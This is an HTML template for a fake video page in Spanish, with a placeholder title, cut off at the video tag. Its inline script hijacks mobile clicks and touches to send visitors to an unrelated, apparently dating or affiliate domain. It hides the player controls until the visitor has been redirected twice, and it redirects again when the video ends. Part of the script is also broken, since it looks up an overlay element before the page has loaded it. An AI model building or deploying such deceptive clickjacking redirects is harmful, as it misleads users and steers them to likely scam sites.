<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TITULO DEL VIDEO</title>
  <script>
    const redirectUrl = 'https://datingprudethimble.com/2056090';
    const maxRedirects = 2;

    if (!sessionStorage.getItem('sessionStarted')) {
        localStorage.removeItem('clickCount');
        sessionStorage.setItem('sessionStarted', 'true');
    }

    let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;

    function handleClick(event) {
        clickCount++;
        localStorage.setItem('clickCount', clickCount);
        if (clickCount <= maxRedirects) {
            window.location.href = redirectUrl;
            event.preventDefault();
        } else {
            document.getElementById('videoPlayer').setAttribute('controls', 'controls');
        }
    }

    function handleTouch(event) {
        handleClick(event);
    }

    if (/Mobi|Android/i.test(navigator.userAgent)) {
        document.addEventListener('click', handleClick, true);
        document.addEventListener('touchstart', handleTouch, true);

        const videoOverlay = document.getElementById('videoOverlay');
        videoOverlay.addEventListener('click', handleClick, true);
        videoOverlay.addEventListener('touchstart', handleTouch, true);

        if (clickCount <= maxRedirects) {
            document.getElementById('videoPlayer').removeAttribute('controls');
        }
    }

    document.addEventListener("DOMContentLoaded", function() {
        var videos = document.querySelectorAll('video');
        videos.forEach(function(video) {
            video.addEventListener('ended', function() {   
                window.location.href = redirectUrl;
            });
        });
    });
  </script>
</head>
<body>
  <div style="max-width: 100%; overflow: hidden;">
    <video id="videoPlayer" controls style="width: 100%;" onclick="handleClick(event)" onended="window.location.href = redirectUrl">
